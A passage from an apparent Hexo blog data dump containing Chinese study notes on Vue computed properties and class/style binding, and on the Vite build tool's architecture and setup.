class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs xml\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span>&gt;</span><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">a</span> <span class=\"hljs-attr\">v-bind:href</span>=<span class=\"hljs-string\">&quot;url&quot;</span>&gt;</span>链接<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">a</span>&gt;</span><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">img</span> <span class=\"hljs-attr\">v-bind:src:</span>=<span class=\"hljs-string\">&quot;imageUrl&quot;</span>/&gt;</span><br><br>     <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">a</span> <span class=\"hljs-attr\">:href</span>=<span class=\"hljs-string\">&quot;url&quot;</span>&gt;</span>链接<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">a</span>&gt;</span><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">img</span> <span class=\"hljs-attr\">:src</span>=<span class=\"hljs-string\">&quot;imageUrl&quot;</span>/&gt;</span><br><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span><br><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"language-javascript\"></span><br><span class=\"language-javascript\">    <span class=\"hljs-attr\">data</span>:&#123;</span><br><span class=\"language-javascript\">        <span class=\"hljs-attr\">url</span>:<span class=\"hljs-string\">&#x27;...&#x27;</span>,</span><br><span class=\"language-javascript\">        <span class=\"hljs-attr\">imageUrl</span>:<span class=\"hljs-string\">&#x27;...&#x27;</span>,</span><br><span class=\"language-javascript\">    &#125;</span><br><span class=\"language-javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p>2.绑定class的几种方法</p>\n<p> （1）表达式为真，则加载css</p>\n<figure class=\"highlight elixir\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs elixir\"> &lt;div <span class=\"hljs-symbol\">:class=<span class=\"hljs-string\">&quot;&#123; &#x27;active&#x27;:isActive,&#x27;error&#x27;:isError &#125;&quot;</span>&gt;&lt;/div&gt;</span><br><br>&lt;script&gt;<br> <span class=\"hljs-symbol\">data:</span>&#123;<br>      <span class=\"hljs-symbol\">isActive:</span> <span class=\"hljs-literal\">true</span>,<br>      <span class=\"hljs-symbol\">isError:</span><span class=\"hljs-literal\">false</span>,<br> &#125;<br> &lt;/script&gt;<br></code></pre></td></tr></table></figure>\n\n<p> （2）使用computed</p>\n<figure class=\"highlight angelscript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs angelscript\">&lt;div :<span class=\"hljs-keyword\">class</span>=&quot;<span class=\"hljs-symbol\">classes</span>&quot;&gt;&lt;/<span class=\"hljs-symbol\">div</span>&gt;<br><br>&lt;<span class=\"hljs-symbol\">script</span>&gt;<br>    <span class=\"hljs-symbol\">computed:<span class=\"hljs-symbol\">function</span></span>()&#123;<br>        <span class=\"hljs-keyword\">return</span>:&#123;<br>            active:<span class=\"hljs-keyword\">this</span>.isActive,<br>        &#125;<br>    &#125;<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure>\n\n<p> (3)组件上使用</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs xml\">  <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">style</span>&gt;</span><span class=\"language-css\"></span><br><span class=\"language-css\">        <span class=\"hljs-selector-class\">.article</span>&#123;</span><br><span class=\"language-css\">            <span class=\"hljs-attribute\">color</span>: red;</span><br><span class=\"language-css\">        &#125;</span><br><span class=\"language-css\">        <span class=\"hljs-selector-class\">.active</span>&#123;</span><br><span class=\"language-css\">            <span class=\"hljs-attribute\">color</span>: black;</span><br><span class=\"language-css\">            <span class=\"hljs-attribute\">font-size</span>: <span class=\"hljs-number\">30px</span>;</span><br><span class=\"language-css\">        &#125;</span><br><span class=\"language-css\">    </span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">style</span>&gt;</span><br><br> <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span> <span class=\"hljs-attr\">id</span>=<span class=\"hljs-string\">&quot;app&quot;</span>&gt;</span><br>        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">my-component</span> <span class=\"hljs-attr\">:class</span>=<span class=\"hljs-string\">&quot;&#123; &#x27;active&#x27;: isActive &#125;&quot;</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">my-component</span>&gt;</span><br>    <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span>&gt;<br><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"language-javascript\"></span><br><span class=\"language-javascript\">    <span class=\"hljs-title class_\">Vue</span>.<span class=\"hljs-title function_\">component</span>(<span class=\"hljs-string\">&#x27;my-component&#x27;</span>,&#123;</span><br><span class=\"language-javascript\">        <span class=\"hljs-attr\">template</span>:<span class=\"hljs-string\">&#x27;&lt;p class=&quot;article&quot;&gt;这是一个组件&lt;/p&gt;&#x27;</span></span><br><span class=\"language-javascript\">    &#125;)</span><br><span class=\"language-javascript\">    <span class=\"hljs-keyword\">var</span> app=<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">Vue</span>(&#123;</span><br><span class=\"language-javascript\">        <span class=\"hljs-attr\">el</span>:<span class=\"hljs-string\">&#x27;#app&#x27;</span>,</span><br><span class=\"language-javascript\">        <span class=\"hljs-attr\">data</span>:&#123;</span><br><span class=\"language-javascript\">            <span class=\"hljs-attr\">isActive</span>:<span class=\"hljs-literal\">true</span></span><br><span class=\"language-javascript\">        &#125;</span><br><span class=\"language-javascript\">    &#125;)</span><br><span class=\"language-javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p>3.绑定内联样式</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs css\">&lt;<span class=\"hljs-selector-tag\">div</span> :style=<span class=\"hljs-string\">&quot;styles&quot;</span>&gt;<br>            这是第二个组件<br>        &lt;/div&gt;<br><br>  data:&#123;<br>            isActive:true,<br>            styles:&#123;<br>                <span class=\"hljs-attribute\">color</span>:<span class=\"hljs-string\">&#x27;pink&#x27;</span>,<br>                fontSize: <span class=\"hljs-number\">35</span> +<span class=\"hljs-string\">&#x27;px&#x27;</span><br>            &#125;<br>        &#125;<br></code></pre></td></tr></table></figure>\n\n\n\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"Ch3-计算属性\"><a href=\"#Ch3-计算属性\" class=\"headerlink\" title=\"Ch3 计算属性\"></a>Ch3 计算属性</h1><p>1.计算属性：遇到复杂的逻辑时，使用计算属性；将所有的计算属性以函数的形式卸载Vue实例的computed属性内，返回计算结果；</p>\n<figure class=\"highlight handlebars\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs handlebars\"><span class=\"language-xml\">  <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span>&gt;</span></span><br><span class=\"language-xml\">            </span><span class=\"hljs-template-variable\">&#123;&#123; <span class=\"hljs-name\">reversedText</span> &#125;&#125;</span><span class=\"language-xml\"></span><br><span class=\"language-xml\">        <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span></span><br><span class=\"language-xml\"></span><br><span class=\"language-xml\">  <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"language-javascript\"></span></span><br><span class=\"language-javascript\"><span class=\"language-xml\">            <span class=\"hljs-attr\">data</span>:&#123;</span></span><br><span class=\"language-javascript\"><span class=\"language-xml\">                <span class=\"hljs-attr\">text</span>: <span class=\"hljs-string\">&#x27;123,456&#x27;</span>,</span></span><br><span class=\"language-javascript\"><span class=\"language-xml\">            &#125;,</span></span><br><span class=\"language-javascript\"><span class=\"language-xml\">            <span class=\"hljs-attr\">computed</span>:&#123;</span></span><br><span class=\"language-javascript\"><span class=\"language-xml\">                <span class=\"hljs-attr\">reversedText</span>: <span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123;</span></span><br><span class=\"language-javascript\"><span class=\"language-xml\">                    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">text</span>.<span class=\"hljs-title function_\">split</span>(<span class=\"hljs-string\">&#x27;,&#x27;</span>).<span class=\"hljs-title function_\">reverse</span>().<span class=\"hljs-title function_\">join</span>(<span class=\"hljs-string\">&#x27;,&#x27;</span>);</span></span><br><span class=\"language-javascript\"><span class=\"language-xml\">                &#125;</span></span><br><span class=\"language-javascript\"><span class=\"language-xml\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span></span><br></code></pre></td></tr></table></figure>\n\n<p>2.用法</p>\n<p>计算属性可以依赖多个vue实例的数据，只要其中一个数据发生变化，计算属性就会重新执行，视图也会更新；</p>\n<p>3.和methods的区别</p>\n<figure class=\"highlight arcade\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs arcade\">&lt;div&gt;<br>    &#123;&#123; reversedText &#125;&#125;<br>&lt;/div&gt;<br><br>&lt;scirpt&gt;<br>    methods:&#123;<br>        <span class=\"hljs-attr\">reverserText</span>:<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123;<br>            <span class=\"hljs-keyword\">return</span> this.<span class=\"hljs-built_in\">text</span>.<span class=\"hljs-built_in\">split</span>(<span class=\"hljs-string\">&#x27;,&#x27;</span>).reverser().join(<span class=\"hljs-string\">&#x27;,&#x27;</span>);<br>        &#125;<br>    &#125;,<br>    <span class=\"hljs-attr\">computed</span>:&#123;<br>         <span class=\"hljs-attr\">reversedText</span>: <span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123;<br>             <span class=\"hljs-keyword\">return</span> this.<span class=\"hljs-built_in\">text</span>.<span class=\"hljs-built_in\">split</span>(<span class=\"hljs-string\">&#x27;,&#x27;</span>).<span class=\"hljs-built_in\">reverse</span>().join(<span class=\"hljs-string\">&#x27;,&#x27;</span>);<br>    &#125;<br>&lt;/scirpt&gt;<br></code></pre></td></tr></table></figure>\n\n<p>两者实现了相同的效果，但是计算属性是基于依赖缓存，一个依赖数据发生变化，才会重新取值；methods只要重新渲染，就会调用；</p>\n<p>当遍历大数组和做大量计算时，应使用计算属性，除非不用缓存；</p>\n<h1 id=\"CH4-v-bind及class与style的绑定\"><a href=\"#CH4-v-bind及class与style的绑定\" class=\"headerlink\" title=\"CH4 v-bind及class与style的绑定\"></a>CH4 v-bind及class与style的绑定</h1><p>1.v-bind指令</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs xml\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span>&gt;</span><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">a</span> <span class=\"hljs-attr\">v-bind:href</span>=<span class=\"hljs-string\">&quot;url&quot;</span>&gt;</span>链接<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">a</span>&gt;</span><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">img</span> <span class=\"hljs-attr\">v-bind:src:</span>=<span class=\"hljs-string\">&quot;imageUrl&quot;</span>/&gt;</span><br><br>     <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">a</span> <span class=\"hljs-attr\">:href</span>=<span class=\"hljs-string\">&quot;url&quot;</span>&gt;</span>链接<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">a</span>&gt;</span><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">img</span> <span class=\"hljs-attr\">:src</span>=<span class=\"hljs-string\">&quot;imageUrl&quot;</span>/&gt;</span><br><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span><br><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"language-javascript\"></span><br><span class=\"language-javascript\">    <span class=\"hljs-attr\">data</span>:&#123;</span><br><span class=\"language-javascript\">        <span class=\"hljs-attr\">url</span>:<span class=\"hljs-string\">&#x27;...&#x27;</span>,</span><br><span class=\"language-javascript\">        <span class=\"hljs-attr\">imageUrl</span>:<span class=\"hljs-string\">&#x27;...&#x27;</span>,</span><br><span class=\"language-javascript\">    &#125;</span><br><span class=\"language-javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p>2.绑定class的几种方法</p>\n<p> （1）表达式为真，则加载css</p>\n<figure class=\"highlight elixir\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs elixir\"> &lt;div <span class=\"hljs-symbol\">:class=<span class=\"hljs-string\">&quot;&#123; &#x27;active&#x27;:isActive,&#x27;error&#x27;:isError &#125;&quot;</span>&gt;&lt;/div&gt;</span><br><br>&lt;script&gt;<br> <span class=\"hljs-symbol\">data:</span>&#123;<br>      <span class=\"hljs-symbol\">isActive:</span> <span class=\"hljs-literal\">true</span>,<br>      <span class=\"hljs-symbol\">isError:</span><span class=\"hljs-literal\">false</span>,<br> &#125;<br> &lt;/script&gt;<br></code></pre></td></tr></table></figure>\n\n<p> （2）使用computed</p>\n<figure class=\"highlight angelscript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs angelscript\">&lt;div :<span class=\"hljs-keyword\">class</span>=&quot;<span class=\"hljs-symbol\">classes</span>&quot;&gt;&lt;/<span class=\"hljs-symbol\">div</span>&gt;<br><br>&lt;<span class=\"hljs-symbol\">script</span>&gt;<br>    <span class=\"hljs-symbol\">computed:<span class=\"hljs-symbol\">function</span></span>()&#123;<br>        <span class=\"hljs-keyword\">return</span>:&#123;<br>            active:<span class=\"hljs-keyword\">this</span>.isActive,<br>        &#125;<br>    &#125;<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure>\n\n<p> (3)组件上使用</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs xml\">  <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">style</span>&gt;</span><span class=\"language-css\"></span><br><span class=\"language-css\">        <span class=\"hljs-selector-class\">.article</span>&#123;</span><br><span class=\"language-css\">            <span class=\"hljs-attribute\">color</span>: red;</span><br><span class=\"language-css\">        &#125;</span><br><span class=\"language-css\">        <span class=\"hljs-selector-class\">.active</span>&#123;</span><br><span class=\"language-css\">            <span class=\"hljs-attribute\">color</span>: black;</span><br><span class=\"language-css\">            <span class=\"hljs-attribute\">font-size</span>: <span class=\"hljs-number\">30px</span>;</span><br><span class=\"language-css\">        &#125;</span><br><span class=\"language-css\">    </span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">style</span>&gt;</span><br><br> <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span> <span class=\"hljs-attr\">id</span>=<span class=\"hljs-string\">&quot;app&quot;</span>&gt;</span><br>        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">my-component</span> <span class=\"hljs-attr\">:class</span>=<span class=\"hljs-string\">&quot;&#123; &#x27;active&#x27;: isActive &#125;&quot;</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">my-component</span>&gt;</span><br>    <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span>&gt;<br><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"language-javascript\"></span><br><span class=\"language-javascript\">    <span class=\"hljs-title class_\">Vue</span>.<span class=\"hljs-title function_\">component</span>(<span class=\"hljs-string\">&#x27;my-component&#x27;</span>,&#123;</span><br><span class=\"language-javascript\">        <span class=\"hljs-attr\">template</span>:<span class=\"hljs-string\">&#x27;&lt;p class=&quot;article&quot;&gt;这是一个组件&lt;/p&gt;&#x27;</span></span><br><span class=\"language-javascript\">    &#125;)</span><br><span class=\"language-javascript\">    <span class=\"hljs-keyword\">var</span> app=<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">Vue</span>(&#123;</span><br><span class=\"language-javascript\">        <span class=\"hljs-attr\">el</span>:<span class=\"hljs-string\">&#x27;#app&#x27;</span>,</span><br><span class=\"language-javascript\">        <span class=\"hljs-attr\">data</span>:&#123;</span><br><span class=\"language-javascript\">            <span class=\"hljs-attr\">isActive</span>:<span class=\"hljs-literal\">true</span></span><br><span class=\"language-javascript\">        &#125;</span><br><span class=\"language-javascript\">    &#125;)</span><br><span class=\"language-javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p>3.绑定内联样式</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs css\">&lt;<span class=\"hljs-selector-tag\">div</span> :style=<span class=\"hljs-string\">&quot;styles&quot;</span>&gt;<br>            这是第二个组件<br>        &lt;/div&gt;<br><br>  data:&#123;<br>            isActive:true,<br>            styles:&#123;<br>                <span class=\"hljs-attribute\">color</span>:<span class=\"hljs-string\">&#x27;pink&#x27;</span>,<br>                fontSize: <span class=\"hljs-number\">35</span> +<span class=\"hljs-string\">&#x27;px&#x27;</span><br>            &#125;<br>        &#125;<br></code></pre></td></tr></table></figure>\n\n\n\n"},{"title":"Vite知识体系","date":"2023-03-27T10:51:45.000Z","mp3":null,"cover":"img/bg3.jpg","_content":"\n\n# Vite知识体系\n\n## 一、浅谈构建工具\n\n### 1. Why we need build tools?\n\n- 模块化（ESM、CommonJS、UMD）\n- 资源编译（高级语法的编译）\n- 产物质量（代码提及、代码性能）\n- 开发效率（热更新）\n\n### 2.构建工具的意义\n\n- 提供模块加载方案、兼容不同的模块规范；\n- 高级语法转义（Sass，TS）、资源加载如图片、字体、worker；\n- 产物压缩、无用代码删除、语法降级；\n- 热更新；\n\n### 3.Vite是什么？Why vite？\n\n##### 组成：\n\n- No-bundle开发服务、源文件无需打包；\n- 生产环境基于Rollup的Bundler；\n\n##### 核心特征：\n\n- 高性能，dev启动速度和热更新速度非常快；\n- 简单易用，开发者体验好；\n\n### 4.当下问题\n\n##### 问题\n\n- 缓慢启动；\n- 缓慢的热更新；\n\n##### 瓶颈\n\n- bundle带来的性能开销；\n- JS语言的性能瓶颈；\n\n##### 行业趋势\n\n- 全球浏览器对原生ESM的普遍支持；\n\n```\n1.script标签增加type=“module”属性；\n2.使用ESM模块导入导出语法；\n```\n\n![](https://s3.bmp.ovh/imgs/2023/02/09/954d53ed35dab73a.jpg)\n\n- 基于原生语言（Go、Rust）编写前端编译工具链；\n\n![](https://s3.bmp.ovh/imgs/2023/02/09/a162a7181e2b1488.jpg)\n\n\n\n## 二、Vite概要\n\n### 1.内置Web构建功能\n\n![](https://s3.bmp.ovh/imgs/2023/02/09/b6130def732894e1.jpg)\n\n![](https://s3.bmp.ovh/imgs/2023/02/09/5766272cb741272e.jpg)\n\n## 三、Vite上手\n\n### 1.项目初始化\n\n```shell\n# 提前安装pnpm\nnpm i -g pnpm\n\n# 初始化命令\npnpm create vite\n\n#安装依赖\npnpm install\n\n#启动项目\nnpm run dev\n\n#安装sass\npnpm install sass -D\n\n#打包\ntsc && vite build\n\n```\n\n```tsx\nimport * as React from 'react';\nimport { Component } from 'react';\nimport styles from './index.module.scss';\n\nexport function Header(){\n    return (\n        <div><h1 className={styles.header}>Header</h1></div>\n    )\n}\n```\n\n```scss\n.header{\n    color:red;\n}\n```\n\n### 2.无需额外配置\n\n> 可以保存组件状态：修改A组件代码时，Web热更新之后，不会影响其他组件的状态；\n\n### 3.Tree Shaking\n\n##### 原理\n\n- 基于ESM的import/export语句依赖关系，与实时状态无关；\n- 在构建阶段将未使用到的代码进行删除；\n- Tree shaking 在vite中无需配置，默认开启；\n\n### 4.优点\n\n- 响应迅速\n- 开箱即用\n\n## 四、Vite整体架构\n\n![](https://s3.bmp.ovh/imgs/2023/02/09/9290159fce29e6d4.jpg)\n\n### 1.单文件编译\n\n> 使用Esbuild编译TS/TSX；\n>\n> 预打包：扫描代码进行预先打包；\n\n##### 优势\n\n- 编译速度提升10-100X\n\n##### 缺点\n\n- 不支持类型检查；（运行之前需要调用`tsc`）\n- 不支持语法降级到ES5；\n\n### 2.代码压缩\n\n> Esbuild作为默认压缩工具，替换传统的Terser、Uglify.js等压缩工具；\n\n### 3.插件机制\n\n- 开发环境：模拟roolup插件机制\n- 生产环境：直接使用rollup\n\n## 五、Vite进阶路线\n\n### 1.深入双引擎\n\n- esbuild\n- rollupJS\n\n##### 学习\n\n- 查看官方文档\n- 先了解基本使用，动手尝试各项常用配置；\n- 学习其插件开发；\n\n### 2.插件机制\n\n- 易于抽离核心逻辑\n- 易于拓展\n\n![](https://s3.bmp.ovh/imgs/2023/02/09/8ef80e5113384463.jpg)\n\n- config\n- resolveId\n- load\n- tranform\n\n![](https://s3.bmp.ovh/imgs/2023/02/09/ad4af8b0fc78d654.jpg)\n\n### 3.学习\n\n- Vite插件开发文档；\n- 学习其他插件实现，json加载等；\n\n### 4.拆包（代码分割）\n\n![](https://s3.bmp.ovh/imgs/2023/02/09/62c96b5942f5b559.jpg)\n\n### 5.JS编译工具（Babel）\n\n源代码->AST->AST->降级代码\n\n- AST为抽象语法树；\n\n### 6.语法安全降级\n\n![](https://s3.bmp.ovh/imgs/2023/02/09/7bd9f45a3245d6e7.jpg)\n\n- 上层解决方案：plugin-legacy\n- 底层原理：借助babel实现；提前注入polyfill；\n\n### 7.服务端渲染（SSR）\n\n- 提升首屏性能\n- SEO优化；\n\n![](https://s3.bmp.ovh/imgs/2023/02/09/c849fc3dd53d12c8.jpg)\n\n### 8.深入理解底层标准\n\n![](https://s3.bmp.ovh/imgs/2023/02/09/5a034d64573a380a.jpg)\n\n","source":"_posts/Vite知识体系.md","raw":"---\ntitle: Vite知识体系\ndate: 2023-03-27 18:51:45\ncategories: \n    - 前端\ntags: \n    - 项目构建\n    - 笔记\nmp3: \ncover: img/bg3.jpg\n---\n\n\n# Vite知识体系\n\n## 一、浅谈构建工具\n\n### 1. Why we need build tools?\n\n- 模块化（ESM、CommonJS、UMD）\n- 资源编译（高级语法的编译）\n- 产物质量（代码提及、代码性能）\n- 开发效率（热更新）\n\n### 2.构建工具的意义\n\n- 提供模块加载方案、兼容不同的模块规范；\n- 高级语法转义（Sass，TS）、资源加载如图片、字体、worker；\n- 产物压缩、无用代码删除、语法降级；\n- 热更新；\n\n### 3.Vite是什么？Why vite？\n\n##### 组成：\n\n- No-bundle开发服务、源文件无需打包；\n- 生产环境基于Rollup的Bundler；\n\n##### 核心特征：\n\n- 高性能，dev启动速度和热更新速度非常快；\n- 简单易用，开发者体验好；\n\n### 4.当下问题\n\n##### 问题\n\n- 缓慢启动；\n- 缓慢的热更新；\n\n##### 瓶颈\n\n- bundle带来的性能开销；\n- JS语言的性能瓶颈；\n\n##### 行业趋势\n\n- 全球浏览器对原生ESM的普遍支持；\n\n```\n1.script标签增加type=“module”属性；\n2.使用ESM模块导入导出语法；\n```\n\n![](https://s3.bmp.ovh/imgs/2023/02/09/954d53ed35dab73a.jpg)\n\n- 基于原生语言（Go、Rust）编写前端编译工具链；\n\n![](https://s3.bmp.ovh/imgs/2023/02/09/a162a7181e2b1488.jpg)\n\n\n\n## 二、Vite概要\n\n### 1.内置Web构建功能\n\n![](https://s3.bmp.ovh/imgs/2023/02/09/b6130def732894e1.jpg)\n\n![](https://s3.bmp.ovh/imgs/2023/02/09/5766272cb741272e.jpg)\n\n## 三、Vite上手\n\n### 1.项目初始化\n\n```shell\n# 提前安装pnpm\nnpm i -g pnpm\n\n# 初始化命令\npnpm create vite\n\n#安装依赖\npnpm install\n\n#启动项目\nnpm run dev\n\n#安装sass\npnpm install sass -D\n\n#打包\ntsc && vite build\n\n```\n\n```tsx\nimport * as React from 'react';\nimport { Component } from 'react';\nimport styles from './index.module.scss';\n\nexport function Header(){\n    return (\n        <div><h1 className={styles.header}>Header</h1></div>\n    )\n}\n```\n\n```scss\n.header{\n    color:red;\n}\n```\n\n### 2.无需额外配置\n\n> 可以保存组件状态：修改A组件代码时，Web热更新之后，不会影响其他组件的状态；\n\n### 3.Tree Shaking\n\n##### 原理\n\n- 基于ESM的import/export语句依赖关系，与实时状态无关；\n- 在构建阶段将未使用到的代码进行删除；\n- Tree shaking 在vite中无需配置，默认开启；\n\n### 4.优点\n\n- 响应迅速\n- 开箱即用\n\n## 四、Vite整体架构\n\n![](https://s3.bmp.ovh/imgs/2023/02/09/9290159fce29e6d4.jpg)\n\n### 1.单文件编译\n\n> 使用Esbuild编译TS/TSX；\n>\n> 预打包：扫描代码进行预先打包；\n\n##### 优势\n\n- 编译速度提升10-100X\n\n##### 缺点\n\n- 不支持类型检查；（运行之前需要调用`tsc`）\n- 不支持语法降级到ES5；\n\n### 